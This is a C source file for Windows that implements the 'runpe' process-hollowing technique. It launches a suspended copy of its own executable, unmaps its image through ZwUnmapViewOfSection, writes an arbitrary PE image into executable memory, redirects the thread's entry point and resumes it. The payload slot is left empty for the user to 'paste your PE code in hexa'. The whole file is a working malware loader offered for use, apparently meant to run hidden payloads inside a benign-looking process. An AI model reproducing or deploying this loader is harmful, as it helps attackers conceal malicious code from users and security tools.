#include <windows.h>
#include <tlhelp32.h>
#include <stdarg.h>
#include <stdio.h>
typedef VOID(*PZUVOS)(HANDLE, PVOID);
#define DEBUG

void print(const char *a, ...){
    #ifdef DEBUG
        va_list args;
        va_start(args,a);
        vprintf(a,args);
        va_end(args);
    #endif
}
//tecnica de runpe 
BOOL runpe(void *image) {
    // PE headers
    PIMAGE_DOS_HEADER pidh;
    PIMAGE_NT_HEADERS pinh;
    PIMAGE_SECTION_HEADER pish;

    // process info
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // pointer to virtually allocated memory
    LPVOID lpAddress = NULL;

    // context of suspended thread for setting address of entry point
    CONTEXT context;

    // need function pointer for ZwUnmapViewOfSection from ntdll.dll
    PZUVOS pZwUnmapViewOfSection = NULL;

    // get file name
    CHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    // first extract header info 
    // check if valid DOS header
    pidh = (PIMAGE_DOS_HEADER)image;
    if (pidh->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("DOS signature error");
        return FALSE;
    }

    // check if valid pe file
    pinh = (PIMAGE_NT_HEADERS)((DWORD)image + pidh->e_lfanew);
    if (pinh->Signature != IMAGE_NT_SIGNATURE) {
        printf("PE signature error");
        return FALSE;
    }

    // first create process as suspended
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    if (CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == FALSE) {
        printf("Create process error %lu\n", GetLastError());
        return FALSE;
    }

    context.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &context) == FALSE) {
        printf("Get thread context");
    }

    // unmap memory space for our process
    pZwUnmapViewOfSection = (PZUVOS)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    pZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);

    // allocate virtual space for process
    lpAddress = VirtualAllocEx(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpAddress == NULL) {
        printf("Virtual alloc error: %lu\n", GetLastError());
        return FALSE;
    }

    // write headers into memory
    if (WriteProcessMemory(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, image, pinh->OptionalHeader.SizeOfHeaders, NULL) == FALSE) {
        printf ("Write headers error: %lu\n", GetLastError());
        return FALSE;
    }

    // write each section into memory
    for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        // calculate section header of each section
        pish = (PIMAGE_SECTION_HEADER)((DWORD)image + pidh->e_lfanew + sizeof (IMAGE_NT_HEADERS) + sizeof (IMAGE_SECTION_HEADER) * i);
        // write section data into memory
        WriteProcessMemory(pi.hProcess, (PVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), (LPVOID)((DWORD)image + pish->PointerToRawData), pish->SizeOfRawData, NULL);
    }

    // set starting address at virtual address: address of entry point
    context.Rax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
    if (SetThreadContext(pi.hThread, &context) == FALSE) {
        printf("Set thread context error: %lu\n", GetLastError());
        return FALSE;
    }

    // resume our suspended processes
    if (ResumeThread(pi.hThread) == -1) {
        printf("Resume thread error: %lu\n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}


int main(int argc, char const *argv[]){
    unsigned char rawData[] = ""; //paste your PE code in hexa
    runpe(rawData);
    getchar();
}
